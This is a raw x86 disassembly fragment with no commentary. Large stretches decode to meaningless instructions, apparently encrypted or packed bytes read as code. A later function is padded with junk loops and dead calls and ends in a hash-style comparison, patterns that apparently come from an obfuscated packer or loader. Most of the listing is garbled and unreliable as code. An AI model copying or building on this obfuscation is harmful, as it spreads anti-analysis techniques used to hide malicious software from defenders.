  421ef9:	mov    al,0x25
  421efb:	sbb    eax,0x564988ad
  421f00:	xor    eax,0x9c841296
  421f05:	call   0x3f12:0xe1d0f229
  421f0c:	and    BYTE PTR [ebx],cl
  421f0e:	or     edx,eax
  421f10:	(bad)  
  421f11:	push   ecx
  421f12:	cwde   
  421f13:	leave  
  421f14:	icebp  
  421f15:	gs mov dh,0x5a
  421f18:	bound  esi,QWORD PTR [ebp+esi*1-0x1df9e7b]
  421f1f:	aaa    
  421f20:	imul   BYTE PTR [ebx]
  421f22:	mov    dl,0x39
  421f24:	hlt    
  421f25:	cmp    eax,0x46f666f6
  421f2a:	mov    edx,0x5dadff56
  421f2f:	jge    0x421f2d
  421f31:	xor    BYTE PTR [ebp+0x60c6bda6],ch
  421f37:	dec    eax
  421f38:	daa    
  421f39:	jmp    0x421f09
  421f3b:	pop    ebx
  421f3c:	fisttp WORD PTR ds:0x4a521495
  421f42:	aam    0xf4
  421f44:	leave  
  421f45:	add    ah,cl
  421f47:	adc    al,dh
  421f49:	out    0x7f,al
  421f4b:	mov    BYTE PTR [eax],ch
  421f4d:	(bad)  
  421f4e:	lods   al,BYTE PTR ds:[esi]
  421f4f:	push   ss
  421f50:	loope  0x421fcb
  421f52:	xchg   cl,ah
  421f54:	sbb    ebp,DWORD PTR [edi+0x26]
  421f57:	and    cx,di
  421f5a:	sbb    al,0xac
  421f5c:	in     al,dx
  421f5d:	xor    bl,BYTE PTR [esi-0x79682a0c]
  421f63:	cld    
  421f64:	out    dx,eax
  421f65:	aas    
  421f66:	xchg   esi,eax
  421f67:	rcl    DWORD PTR [eax-0x5620e73c],cl
  421f6d:	pop    ss
  421f6e:	scas   eax,DWORD PTR es:[edi]
  421f6f:	cmp    ch,BYTE PTR [ecx+ebx*2-0x38]
  421f73:	lahf   
  421f74:	xor    ebx,esi
  421f76:	push   esi
  421f77:	dec    ebp
  421f78:	sub    DWORD PTR [bx+di-0x3290],edi
  421f7d:	bound  ebp,QWORD PTR [ecx+0x4abf7f71]
  421f83:	ror    ebp,0xf8
  421f86:	jmp    0x421fd4
  421f88:	sahf   
  421f89:	jmp    0x7d8f5a43
  421f8e:	lahf   
  421f8f:	xlat   BYTE PTR ds:[ebx]
  421f90:	ins    BYTE PTR es:[edi],dx
  421f91:	sub    ecx,esp
  421f93:	out    dx,eax
  421f94:	jge    0x421f9c
  421f96:	dec    edx
  421f97:	or     edx,esp
  421f99:	fldcw  WORD PTR [edx+esi*2-0x22]
  421f9d:	push   esi
  421f9e:	pop    ss
  421f9f:	jmp    0xf0b4:0x76ebd765
  421fa6:	ror    DWORD PTR [edx],1
  421fa8:	rcr    BYTE PTR [edx+0x55],1
  421fab:	je     0x422002
  421fad:	sub    BYTE PTR [ecx+0x340394a1],al
  421fb3:	xor    al,0xad
  421fb5:	shl    DWORD PTR [ebp+0x7d39cb83],0x3c
  421fbc:	inc    ebx
  421fbd:	call   0x76028313
  421fc2:	arpl   WORD PTR [ecx-0x79f933ba],dx
  421fc8:	in     eax,0x1d
  421fca:	and    edi,DWORD PTR [ecx+0xc]
  421fcd:	fwait
  421fce:	dec    eax
  421fcf:	clc    
  421fd0:	push   es
  421fd1:	test   al,0xd3
  421fd3:	lods   eax,DWORD PTR ds:[esi]
  421fd4:	fiadd  WORD PTR [eax-0x56]
  421fd7:	ret    
  421fd8:	inc    ebx
  421fd9:	jo     0x421ffe
  421fdb:	(bad)  
  421fdc:	mov    bl,0xe1
  421fde:	lea    edx,[edx-0x278c7509]
  421fe4:	jmp    0x54fc:0xc0b76383
  421feb:	popf   
  421fec:	in     eax,0x82
  421fee:	xchg   ecx,eax
  421fef:	mov    ecx,0xb253bcf9
  421ff4:	out    dx,eax
  421ff5:	out    0xcf,al
  421ff7:	dec    edi
  421ff8:	(bad)  [edi-0x59781752]
  421ffe:	dec    ebx
  421fff:	sti    
  422000:	cld    
  422001:	ds push ebp
  422003:	sub    eax,ecx
  422005:	aam    0x13
  422007:	lods   eax,DWORD PTR ds:[esi]
  422008:	xchg   esi,eax
  422009:	dec    ebp
  42200a:	xor    BYTE PTR [esp+eax*2],dh
  42200d:	jne    0x422021
  42200f:	enter  0x71a6,0xc
  422013:	sbb    eax,0x43824173
  422018:	outs   dx,BYTE PTR ds:[esi]
  422019:	mov    ds:0x466abfbf,eax
  42201e:	xchg   edi,eax
  42201f:	mov    DWORD PTR [esi+0x350b7854],ebp
  422025:	mov    edi,0xdcb5f17b
  42202a:	imul   BYTE PTR ds:0xad7dd74c
  422030:	dec    eax
  422031:	xor    esi,0xfffffff3
  422034:	(bad)  
  422035:	call   0xdb77:0x256fe1b1
  42203c:	xor    dl,dl
  42203e:	scas   eax,DWORD PTR es:[edi]
  42203f:	in     eax,0x3f
  422041:	ds lahf 
  422043:	enter  0xe2f9,0x8a
  422047:	sub    cl,BYTE PTR [eax+ebp*2-0x1]
  42204b:	jo     0x421fe9
  42204d:	das    
  42204e:	xor    BYTE PTR [ecx+0x61],al
  422051:	punpckhdq mm1,mm1
  422054:	das    
  422055:	outs   dx,DWORD PTR ds:[esi]
  422056:	sbb    BYTE PTR [edx+0x78dec69],ch
  42205c:	jl     0x4220bd
  42205e:	pcmpgtb mm7,mm7
  422061:	push   DWORD PTR ds:0x4283a7
  422067:	push   DWORD PTR ds:0x428423
  42206d:	push   DWORD PTR [ebp-0x28]
  422070:	push   DWORD PTR [ebp-0x2c]
  422073:	mov    eax,DWORD PTR [ebp-0x14]
  422076:	call   eax
  422078:	mov    eax,DWORD PTR [ebp-0x30]
  42207b:	jmp    0x422522
  422080:	xchg   ebp,eax
  422081:	rol    DWORD PTR [edx],0x97
  422084:	push   es
  422085:	mov    eax,DWORD PTR [edi+0x689842c3]
  42208b:	test   bh,0x81
  42208e:	sbb    edi,DWORD PTR [ebp+0x7a7d8aa0]
  422094:	hlt    
  422095:	jle    0x422111
  422097:	jp     0x42204a
  422099:	sub    ebp,edx
  42209b:	mov    ah,0x7e
  42209d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42209e:	add    DWORD PTR [esi+0x4d],0xb6a7f725
  4220a5:	mov    dl,0xb1
  4220a7:	mov    cs:0x781600fa,al
  4220ad:	xchg   ebx,eax
  4220ae:	add    al,0x97
  4220b0:	std    
  4220b1:	lods   al,BYTE PTR ds:[esi]
  4220b2:	dec    esi
  4220b3:	sbb    BYTE PTR [esi],dl
  4220b5:	cmc    
  4220b6:	stc    
  4220b7:	shr    DWORD PTR [eax],1
  4220b9:	aas    
  4220ba:	jmp    0x7e1b:0x6f9473c9
  4220c1:	loope  0x4220d4
  4220c3:	scas   al,BYTE PTR es:[edi]
  4220c4:	inc    ecx
  4220c5:	setl   BYTE PTR [esi+ebp*4+0x5e64436a]
  4220cd:	inc    edx
  4220ce:	repz retf 
  4220d0:	cmc    
  4220d1:	jae    0x4220ad
  4220d3:	pop    ds
  4220d4:	hlt    
  4220d5:	aas    
  4220d6:	test   al,0x6
  4220d8:	ins    DWORD PTR es:[edi],dx
  4220d9:	out    0x4c,eax
  4220db:	lea    esi,[esi+0x49005b70]
  4220e1:	push   0xcbc28b13
  4220e6:	lock inc ebx
  4220e8:	push   cs
  4220e9:	sbb    eax,0x14c1628b
  4220ee:	dec    ebx
  4220ef:	inc    edx
  4220f0:	push   ds
  4220f1:	sbb    BYTE PTR [edi],bh
  4220f3:	hlt    
  4220f4:	push   ds
  4220f5:	(bad)  
  4220f6:	retf   0xde29
  4220f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4220fa:	stos   BYTE PTR es:[edi],al
  4220fb:	pop    esp
  4220fc:	sbb    DWORD PTR [edi],0xffffffbf
  4220ff:	mov    al,0xef
  422101:	popa   
  422102:	popa   
  422103:	mov    WORD PTR [esi],es
  422105:	call   0x3521:0x3da5fbdc
  42210c:	in     eax,0x7c
  42210e:	(bad)  
  42210f:	imul   edi,DWORD PTR [eax+0x5a],0xd221af45
  422116:	sbb    BYTE PTR [ecx+0x19],dh
  422119:	inc    esi
  42211a:	cwde   
  42211b:	mov    edi,0x3492ea7f
  422120:	mov    edi,0x535923fb
  422125:	ss add eax,0x86ebe0c8
  42212b:	add    cl,dh
  42212d:	neg    DWORD PTR [edi+0x42]
  422130:	xor    eax,0x7bbc0ad1
  422135:	xchg   BYTE PTR [eax+esi*2-0x42],dl
  422139:	sbb    eax,0x3e622226
  42213e:	and    eax,0x5e092250
  422143:	mov    eax,0x58b7327a
  422148:	jmp    0x422117
  42214a:	jmp    0x31a8:0x425e1a43
  422151:	or     eax,0x59e13495
  422156:	aaa    
  422157:	xor    dl,bh
  422159:	or     esp,DWORD PTR [ebx]
  42215b:	ds xchg esp,eax
  42215d:	lea    ebp,[edx+0x51d4fb0f]
  422163:	push   esi
  422164:	mov    dh,0x31
  422166:	cmc    
  422167:	adc    al,0xd0
  422169:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42216a:	test   eax,0x2d44bc71
  42216f:	sbb    ebp,DWORD PTR [si]
  422172:	pop    edi
  422173:	add    eax,0x1ed8facd
  422178:	cmp    al,0x1b
  42217a:	gs jecxz 0x422188
  42217d:	and    ecx,0x88dbdc08
  422183:	jb     0x422161
  422185:	std    
  422186:	or     al,0x19
  422188:	jl     0x4221e8
  42218a:	pop    edi
  42218b:	out    dx,al
  42218c:	cmp    ebx,DWORD PTR [ecx]
  42218e:	lods   eax,DWORD PTR ds:[esi]
  42218f:	popf   
  422190:	mov    WORD PTR [edi],gs
  422192:	mov    esi,0x9dd6c0ba
  422197:	mov    esp,0xc663aa87
  42219c:	outs   dx,BYTE PTR ds:[esi]
  42219d:	dec    esi
  42219e:	in     eax,dx
  42219f:	bound  ebp,QWORD PTR [eax]
  4221a1:	mov    cl,0xf
  4221a3:	or     cl,BYTE PTR gs:[edx+0x37e0464b]
  4221aa:	das    
  4221ab:	adc    eax,0xab398301
  4221b0:	addr16 mov ebp,0x9bd6ff06
  4221b6:	add    DWORD PTR [ecx+ebp*1],edx
  4221b9:	rcl    BYTE PTR [edx],0xb3
  4221bc:	pop    ecx
  4221bd:	addr16 popf 
  4221bf:	add    bl,ah
  4221c1:	xchg   esp,eax
  4221c2:	fidiv  DWORD PTR [ebp-0x6d068d7c]
  4221c8:	bound  edi,QWORD PTR gs:[eax+esi*8+0x14]
  4221cd:	xor    ebp,DWORD PTR [edi-0x4df15d6a]
  4221d3:	jo     0x4221de
  4221d5:	(bad)  
  4221d6:	xchg   ebx,eax
  4221d7:	lahf   
  4221d8:	cmp    eax,0x62d939a3
  4221dd:	int3   
  4221de:	jbe    0x4221ce
  4221e0:	and    al,0xb9
  4221e2:	jl     0x42225f
  4221e4:	pop    ecx
  4221e5:	sub    cl,BYTE PTR [esi]
  4221e7:	fld    QWORD PTR [ebp+esi*4-0x19]
  4221eb:	mov    ebp,DWORD PTR [eax]
  4221ed:	jno    0x422227
  4221ef:	jg     0x4221cc
  4221f1:	push   ss
  4221f2:	jmp    0x529750d2
  4221f7:	jmp    0xf97b:0xd812019a
  4221fe:	retf   0x7692
  422201:	add    ecx,DWORD PTR [edi+0x100ca8ef]
  422207:	jo     0x42221a
  422209:	push   ebx
  42220a:	(bad)  
  42220b:	adc    BYTE PTR [ecx+0x6e],al
  42220e:	xchg   edx,eax
  42220f:	jg     0x4221b8
  422211:	mov    al,ds:0xe33847ad
  422216:	or     eax,DWORD PTR [ebx+ebx*8+0x5fe7d0cc]
  42221d:	jl     0x4221d7
  42221f:	ret    
  422220:	or     BYTE PTR [edi+0x18fb1aa1],bh
  422226:	arpl   WORD PTR [ecx],cx
  422228:	cmp    BYTE PTR ss:[ebx],0x5a
  42222c:	adc    edi,DWORD PTR ds:0x1e0ba2fd
  422232:	stos   DWORD PTR es:[edi],eax
  422233:	adc    ah,ch
  422235:	je     0x42220b
  422237:	repnz (bad) 
  422239:	mov    eax,0x2595f855
  42223e:	cmp    DWORD PTR [ebp+0x2530ea90],ecx
  422244:	cwde   
  422245:	cmp    DWORD PTR ds:0x2322df86,0xd25ff747
  42224f:	cwde   
  422250:	cmp    BYTE PTR [ebp+0x6b],bh
  422253:	frstor [esi+0x673b0bcf]
  422259:	int    0x34
  42225b:	sar    BYTE PTR [esi+0x485ea1cc],0x78
  422262:	lods   al,BYTE PTR ds:[esi]
  422263:	jl     0x4221f7
  422265:	and    eax,0xad469722
  42226a:	cmp    eax,0xfdca36dc
  42226f:	jmp    0x6b08f621
  422274:	lods   al,BYTE PTR ds:[esi]
  422275:	xchg   esi,eax
  422276:	adc    eax,0xf1cd7718
  42227b:	idiv   DWORD PTR [edx+0x5e]
  42227e:	mov    DWORD PTR [edx],ebx
  422280:	rcl    bl,1
  422282:	aam    0x8e
  422284:	mov    al,dh
  422286:	gs jae 0xa491ec76
  42228d:	call   0xcf06e106
  422292:	in     al,dx
  422293:	jnp    0x422289
  422295:	std    
  422296:	inc    ecx
  422297:	xor    al,0x9a
  422299:	sub    eax,0x37990f41
  42229e:	aas    
  42229f:	hlt    
  4222a0:	pop    ebp
  4222a1:	(bad)  
  4222a3:	pop    edi
  4222a4:	out    dx,eax
  4222a5:	mov    bh,0x6f
  4222a7:	repz lock shl BYTE PTR [eax],cl
  4222ab:	pushf  
  4222ac:	scas   al,BYTE PTR es:[edi]
  4222ad:	mov    dl,BYTE PTR [esi+eiz*1]
  4222b0:	(bad)
  4222b3:	(bad)  
  4222b4:	xchg   edx,eax
  4222b5:	(bad)  
  4222b6:	pop    esi
  4222b7:	pop    edi
  4222b8:	mov    cl,0xc8
  4222ba:	(bad)  
  4222bb:	pop    ecx
  4222bc:	retf   0x7d31
  4222bf:	aad    0x57
  4222c1:	or     DWORD PTR [esi+0x7d7024da],0xffffffa9
  4222c8:	in     al,0xee
  4222ca:	push   eax
  4222cb:	fldenv [edx-0x2a]
  4222ce:	rcl    BYTE PTR [esi+0x30d9d777],cl
  4222d4:	jmp    0x74d0:0xfd9de6da
  4222db:	mov    DWORD PTR [ebx],eax
  4222dd:	mov    ?,esp
  4222df:	mov    ds:0x90346d88,eax
  4222e4:	(bad)  
  4222e5:	clc    
  4222e6:	cmp    DWORD PTR [ebx],0xfffffff3
  4222e9:	adc    BYTE PTR [edx],ah
  4222eb:	sbb    eax,0xf6e5ccac
  4222f0:	mul    DWORD PTR [ebx-0x5aca2c73]
  4222f6:	pop    esi
  4222f7:	push   cs
  4222f8:	repz jbe 0x4222d7
  4222fb:	sar    DWORD PTR [edx],cl
  4222fd:	sbb    DWORD PTR [edi+0x47],edx
  422300:	enter  0xc1f,0x86
  422304:	pop    es
  422305:	repz cmp DWORD PTR [ecx],esi
  422308:	jge    0x422361
  42230a:	adc    eax,0x7d947f92
  42230f:	aad    0x60
  422311:	outs   dx,BYTE PTR ds:[esi]
  422312:	jbe    0x4222de
  422314:	add    eax,0xe2402706
  422319:	cmp    edi,DWORD PTR [esi]
  42231b:	pop    eax
  42231c:	mov    ebp,0x57dfb080
  422321:	inc    edx
  422322:	xchg   esi,eax
  422323:	fwait
  422324:	jae    0x422323
  422326:	les    eax,FWORD PTR [edi+0x6b099730]
  42232c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42232d:	inc    ebp
  42232e:	sbb    al,0x4b
  422330:	xor    DWORD PTR [eax+0x65211927],ebx
  422336:	push   esp
  422337:	arpl   WORD PTR [ebx+edi*1-0x7d8a2eb],bp
  42233e:	mov    esp,0x9c24119
  422343:	xor    BYTE PTR [esi+0x58],cl
  422346:	(bad)  
  422347:	fpatan 
  422349:	push   esp
  42234a:	hlt    
  42234b:	pushf  
  42234c:	pusha  
  42234d:	adc    al,0xa
  42234f:	lds    ebp,FWORD PTR [ebx+0x3]
  422352:	or     esp,DWORD PTR [ebx]
  422354:	mov    esp,0x6f68208c
  422359:	cmp    ecx,esi
  42235b:	scas   eax,DWORD PTR es:[edi]
  42235c:	mov    bl,0x2
  42235e:	mov    edx,0x4a5cddf8
  422363:	cld    
  422364:	(bad)  
  422365:	into   
  422366:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422367:	mov    ecx,0x850eae85
  42236c:	push   es
  42236d:	adc    cl,al
  42236f:	dec    ecx
  422370:	enter  0x8ce3,0xac
  422374:	jmp    0x184e:0x9822d51d
  42237b:	fst    st(6)
  42237d:	jbe    0x42236b
  42237f:	pop    ds
  422380:	mov    edx,0x73fa1ae5
  422385:	or     DWORD PTR [ebp-0x11d09df6],ecx
  42238b:	or     ebx,ebx
  42238d:	mov    ebp,0xf8ae3029
  422392:	mov    cl,BYTE PTR [ecx]
  422394:	jo     0x42232f
  422396:	add    cl,cl
  422398:	sub    ebx,DWORD PTR [eax]
  42239a:	push   ds
  42239b:	test   cl,0xc7
  42239e:	js     0x42238e
  4223a0:	mov    eax,0x4dbed007
  4223a5:	dec    esi
  4223a6:	adc    al,0xbd
  4223a8:	pusha  
  4223a9:	cwde   
  4223aa:	inc    esi
  4223ab:	push   eax
  4223ac:	imul   edx,ecx,0x3
  4223af:	(bad)  
  4223b0:	stc    
  4223b1:	mov    al,ds:0x495217c3
  4223b6:	inc    esi
  4223b7:	push   cs
  4223b8:	sub    edx,DWORD PTR [edx]
  4223ba:	or     eax,0xa8864f63
  4223bf:	retf   
  4223c0:	xchg   BYTE PTR [esi-0x763aac52],cl
  4223c6:	cwde   
  4223c7:	aaa    
  4223c8:	jecxz  0x4223d8
  4223ca:	cld    
  4223cb:	fld    st(0)
  4223cd:	cmp    edx,DWORD PTR [ebp-0x3883f8a4]
  4223d3:	js     0x422359
  4223d5:	ins    DWORD PTR es:[edi],dx
  4223d6:	sub    ebx,DWORD PTR [eax-0x14]
  4223d9:	xchg   ebp,eax
  4223da:	sbb    DWORD PTR [ecx],esp
  4223dc:	fisub  WORD PTR [eax+0x6]
  4223df:	adc    esp,DWORD PTR [ebx]
  4223e1:	and    al,0xdc
  4223e3:	push   esi
  4223e4:	pop    ebx
  4223e5:	add    eax,0xe88dd1ae
  4223ea:	xchg   bh,ch
  4223ec:	ss xchg esp,eax
  4223ee:	fwait
  4223ef:	dec    ebx
  4223f0:	jbe    0x4223e2
  4223f2:	push   0xffffffd4
  4223f4:	ret    0xee2e
  4223f7:	cdq    
  4223f8:	sbb    DWORD PTR [ebx],ebx
  4223fa:	and    dl,BYTE PTR [ebp-0x587fa151]
  422400:	stos   BYTE PTR es:[edi],al
  422401:	dec    esp
  422402:	icebp  
  422403:	data16 clc 
  422405:	xor    edx,DWORD PTR [di+0xe]
  422409:	dec    ebx
  42240a:	push   es
  42240b:	xchg   ebp,eax
  42240c:	inc    ecx
  42240d:	mov    dl,0x8a
  42240f:	scas   al,BYTE PTR es:[edi]
  422410:	add    BYTE PTR [eax+0xa],al
  422413:	stc    
  422414:	pop    edx
  422415:	(bad)  
  422416:	in     eax,0x8e
  422418:	xor    cl,BYTE PTR [eax-0x6706fabb]
  42241e:	hlt    
  42241f:	add    al,dh
  422421:	sbb    eax,0x6dc16f2e
  422426:	xchg   edi,eax
  422427:	mov    ?,WORD PTR [eax+0x34581984]
  42242d:	xor    ch,BYTE PTR [esi+0x769dd6f2]
  422433:	or     BYTE PTR [edx],dh
  422435:	xchg   esp,eax
  422436:	sahf   
  422437:	shr    DWORD PTR [esi+ebx*2+0x1aed0fc4],cl
  42243e:	mov    WORD PTR [edi+0x1e],ss
  422441:	add    ax,0xd619
  422445:	lahf   
  422446:	add    eax,0xf7dce75
  42244b:	pop    esi
  42244c:	sbb    dl,BYTE PTR [ecx-0x4804fc36]
  422452:	cmp    cl,0x9b
  422455:	(bad)  
  422456:	sub    bh,ch
  422458:	cmovp  edx,DWORD PTR [edx+edx*2]
  42245c:	inc    ebx
  42245d:	and    DWORD PTR [eax+0x2f],esi
  422460:	pop    edx
  422461:	pop    ebp
  422462:	inc    eax
  422463:	sti    
  422464:	push   esi
  422465:	mov    al,0xd9
  422467:	shl    BYTE PTR [ebp+0x3997fde3],1
  42246d:	mov    ch,0xdb
  42246f:	push   ds
  422470:	mov    dh,0xb3
  422472:	les    ecx,FWORD PTR [edi-0x43]
  422475:	bound  ebx,QWORD PTR [esi]
  422477:	data16 cmp al,0xa7
  42247a:	jmp    0x42247d
  42247c:	retf   
  42247d:	pop    ss
  42247e:	repz xlat BYTE PTR ds:[ebx]
  422480:	adc    BYTE PTR [ebx+0x72],bl
  422483:	pop    esi
  422484:	push   ebx
  422485:	push   ss
  422486:	loopne 0x4224c2
  422488:	clc    
  422489:	mov    esi,0xdbfc0c18
  42248e:	scas   eax,DWORD PTR es:[edi]
  42248f:	fild   QWORD PTR [ebx+0x1a5f50e0]
  422495:	xchg   DWORD PTR gs:[eax+ecx*8],esp
  422499:	ret    0x54e5
  42249c:	xor    esp,esi
  42249e:	push   0x877403d
  4224a3:	mov    edi,0x576ec59
  4224a8:	mov    WORD PTR [ebx],?
  4224aa:	sar    BYTE PTR [ecx+ebx*8+0x5a],1
  4224ae:	push   0xffffff99
  4224b0:	or     edx,edx
  4224b2:	(bad)  
  4224b3:	xchg   ebx,eax
  4224b4:	mov    al,0x7a
  4224b6:	imul   eax,DWORD PTR [ebp-0x50e0e364],0x1072d83c
  4224c0:	dec    esp
  4224c1:	in     eax,0xa5
  4224c3:	xchg   esp,eax
  4224c4:	cmp    cl,BYTE PTR [ebp+0x3c]
  4224c7:	fldcw  WORD PTR [edi+edx*2]
  4224ca:	jae    0x422476
  4224cc:	mov    ch,0x5e
  4224ce:	addr16 sub eax,edx
  4224d1:	retf   0xf67c
  4224d4:	cwde   
  4224d5:	shr    BYTE PTR [ecx],cl
  4224d7:	mov    ecx,ss
  4224d9:	bound  ebx,QWORD PTR [ebx+0x2f]
  4224dc:	jae    0x422528
  4224de:	ins    BYTE PTR es:[edi],dx
  4224df:	mov    bl,0xe
  4224e1:	add    ebp,DWORD PTR [ebp+0x4d]
  4224e4:	cmp    al,0xe3
  4224e6:	and    edx,DWORD PTR [eax-0x41]
  4224e9:	in     ax,0x78
  4224ec:	sub    ecx,ebx
  4224ee:	shl    esi,1
  4224f0:	or     dl,BYTE PTR [edx]
  4224f2:	cmp    al,0xeb
  4224f4:	pop    esi
  4224f5:	or     bl,BYTE PTR [ebx]
  4224f7:	xchg   DWORD PTR [eax+0x5763100c],edx
  4224fd:	mov    esi,0x67332351
  422502:	dec    ebx
  422503:	sbb    esi,DWORD PTR [ecx+0x58]
  422506:	sbb    ebp,esi
  422508:	push   esi
  422509:	in     eax,dx
  42250a:	push   edx
  42250b:	loope  0x422549
  42250d:	ss cmc 
  42250f:	std    
  422510:	xor    dl,BYTE PTR [ebp-0x4bfc097d]
  422516:	loope  0x4224b6
  422518:	ss es popa 
  42251b:	popf   
  42251c:	sbb    ch,BYTE PTR [ecx+0x5ae915cf]
  422522:	mov    ecx,DWORD PTR ds:0x42836b
  422528:	add    DWORD PTR [eax],ecx
  42252a:	pop    edi
  42252b:	pop    esi
  42252c:	leave  
  42252d:	ret    
  42252e:	push   ebp
  42252f:	mov    ebp,esp
  422531:	sub    esp,0x18
  422534:	mov    DWORD PTR [ebp-0x10],0xf89f85b0
  42253b:	movzx  edx,WORD PTR ds:0x428673
  422542:	and    edx,DWORD PTR ds:0x42864f
  422548:	mov    DWORD PTR ds:0x428673,edx
  42254e:	lea    eax,[ebp+0x14]
  422551:	adc    DWORD PTR ds:0x428607,0x604f
  42255b:	mov    DWORD PTR [ebp-0x4],eax
  42255e:	mov    ecx,DWORD PTR ds:0x4285f3
  422564:	adc    DWORD PTR ds:0x4285df,ecx
  42256a:	push   esi
  42256b:	add    DWORD PTR ds:0x42861b,ecx
  422571:	mov    esi,0xf89c85b0
  422576:	or     DWORD PTR ds:0x4285db,0x4285f7
  422580:	mov    DWORD PTR [ebp-0xc],esi
  422583:	mov    DWORD PTR ds:0x42862f,0x1a
  42258d:	cmp    DWORD PTR ds:0x42862f,0x0
  422594:	je     0x4225f8
  42259a:	cmp    DWORD PTR ds:0x42862f,0xa
  4225a1:	jge    0x4225f8
  4225a7:	jmp    0x4225cc
  4225ac:	push   0x428673
  4225b1:	push   DWORD PTR [ebp-0x20]
  4225b4:	push   0x8204
  4225b9:	push   0x6126
  4225be:	push   0x7868
  4225c3:	push   DWORD PTR [ebp-0x28]
  4225c6:	call   DWORD PTR ds:0x4287c7
  4225cc:	cmp    DWORD PTR ds:0x42862f,0xb
  4225d3:	jne    0x4225e6
  4225d9:	mov    edx,DWORD PTR ds:0x42862f
  4225df:	dec    edx
  4225e0:	mov    DWORD PTR ds:0x42862f,edx
  4225e6:	mov    edx,DWORD PTR ds:0x42862f
  4225ec:	dec    edx
  4225ed:	mov    DWORD PTR ds:0x42862f,edx
  4225f3:	jmp    0x42258d
  4225f8:	lea    eax,[ebp-0xc]
  4225fb:	mov    DWORD PTR [ebp-0x14],eax
  4225fe:	mov    eax,DWORD PTR [ebp-0xc]
  422601:	or     DWORD PTR ds:0x42863f,0x672c
  42260b:	mov    edx,DWORD PTR [ebp-0x14]
  42260e:	mov    ecx,0x75108a4
  422613:	add    DWORD PTR ds:0x428617,0x428607
  42261d:	xor    eax,ecx
  42261f:	add    eax,0x3272ec
  422624:	sub    DWORD PTR ds:0x42862b,0x430
  42262e:	mov    DWORD PTR [edx],eax
  422630:	movzx  eax,WORD PTR ds:0x42861b
  422637:	sbb    eax,DWORD PTR ds:0x4285cf
  42263d:	mov    ds:0x42861b,eax
  422642:	mov    eax,ds:0x428167
  422647:	mov    DWORD PTR ds:0x428617,0x1a
  422651:	cmp    DWORD PTR ds:0x428617,0x0
  422658:	je     0x422694
  42265e:	cmp    DWORD PTR ds:0x428617,0x2a
  422665:	jl     0x422694
  42266b:	jmp    0x422680
  422670:	push   0x42860b
  422675:	push   0x428083
  42267a:	call   DWORD PTR ds:0x4287cb
  422680:	xor    edx,edx
  422682:	xor    edx,DWORD PTR ds:0x428617
  422688:	dec    edx
  422689:	mov    DWORD PTR ds:0x428617,edx
  42268f:	jmp    0x422651
  422694:	mov    edx,DWORD PTR [ebp-0x4]
  422697:	mov    eax,DWORD PTR [eax]
  422699:	add    eax,DWORD PTR [edx]
  42269b:	neg    edx
  42269d:	push   edi
  42269e:	and    DWORD PTR ds:0x428613,0x0
  4226a8:	jmp    0x4226ba
  4226ad:	mov    edi,DWORD PTR ds:0x428613
  4226b3:	inc    edi
  4226b4:	mov    DWORD PTR ds:0x428613,edi
  4226ba:	cmp    DWORD PTR ds:0x428613,0x13
  4226c1:	jae    0x4226f9
  4226c7:	cmp    DWORD PTR ds:0x428613,0x14
  4226ce:	jb     0x4226f9
  4226d4:	jmp    0x4226f4
  4226d9:	push   0x5e63
  4226de:	push   DWORD PTR [ebp-0x10]
  4226e1:	push   0x40fa
  4226e6:	push   0x57ff
  4226eb:	push   DWORD PTR [ebp-0x14]
  4226ee:	call   DWORD PTR ds:0x42879f
  4226f4:	jmp    0x4226ad
  4226f9:	mov    DWORD PTR [ebp-0x8],eax
  4226fc:	mov    edi,DWORD PTR [ebp+0x8]
  4226ff:	mov    DWORD PTR ds:0x428643,0x13
  422709:	cmp    DWORD PTR ds:0x428643,0x0
  422710:	je     0x42275e
  422716:	cmp    DWORD PTR ds:0x428643,0x8
  42271d:	jb     0x42275e
  422723:	jmp    0x422733
  422728:	push   0x6e63
  42272d:	call   DWORD PTR ds:0x4287a3
  422733:	cmp    DWORD PTR ds:0x428643,0x9
  42273a:	jne    0x42274b
  422740:	mov    eax,ds:0x428643
  422745:	dec    eax
  422746:	mov    ds:0x428643,eax
  42274b:	xor    eax,eax
  42274d:	xor    eax,DWORD PTR ds:0x428643
  422753:	dec    eax
  422754:	mov    ds:0x428643,eax
  422759:	jmp    0x422709
  42275e:	mov    eax,ds:0x4282ef
  422763:	and    DWORD PTR ds:0x428647,0x0
  42276d:	xor    edx,edx
  42276f:	or     edx,DWORD PTR ds:0x428647
  422775:	inc    edx
  422776:	mov    DWORD PTR ds:0x428647,edx
  42277c:	cmp    DWORD PTR ds:0x428647,0x8
  422783:	jb     0x4227c3
  422789:	jmp    0x42279c
  42278e:	push   DWORD PTR [ebp-0x18]
  422791:	push   0x42804c
  422796:	call   DWORD PTR ds:0x4287a7
  42279c:	cmp    DWORD PTR ds:0x428647,0x7
  4227a3:	jne    0x4227b6
  4227a9:	mov    edx,DWORD PTR ds:0x428647
  4227af:	inc    edx
  4227b0:	mov    DWORD PTR ds:0x428647,edx
  4227b6:	cmp    DWORD PTR ds:0x428647,0x16
  4227bd:	jb     0x42276d
  4227c3:	mov    eax,DWORD PTR [eax+0x198]
  4227c9:	and    DWORD PTR ds:0x428637,0x0
  4227d3:	mov    edx,DWORD PTR ds:0x428637
  4227d9:	inc    edx
  4227da:	mov    DWORD PTR ds:0x428637,edx
  4227e0:	cmp    DWORD PTR ds:0x428637,0x9
  4227e7:	jg     0x42282b
  4227ed:	jmp    0x422802
  4227f2:	push   0x428034
  4227f7:	push   0x1
  4227f9:	push   DWORD PTR [ebp-0x1c]
  4227fc:	call   DWORD PTR ds:0x4287ab
  422802:	cmp    DWORD PTR ds:0x428637,0x8
  422809:	jne    0x42281e
  42280f:	xor    edx,edx
  422811:	add    edx,DWORD PTR ds:0x428637
  422817:	inc    edx
  422818:	mov    DWORD PTR ds:0x428637,edx
  42281e:	cmp    DWORD PTR ds:0x428637,0x18
  422825:	jb     0x4227d3
  42282b:	xor    edi,ecx
  42282d:	mov    edx,0x3272ec
  422832:	add    edi,edx
  422834:	cmp    DWORD PTR [eax],edi
  422836:	je     0x422857
  42283c:	mov    DWORD PTR ds:0x42861f,0x7dc0
  422846:	mov    eax,DWORD PTR [eax]
  422848:	mov    DWORD PTR ds:0x428607,0x131c
  422852:	jmp    0x422ae5
  422857:	mov    DWORD PTR ds:0x4285e3,edi
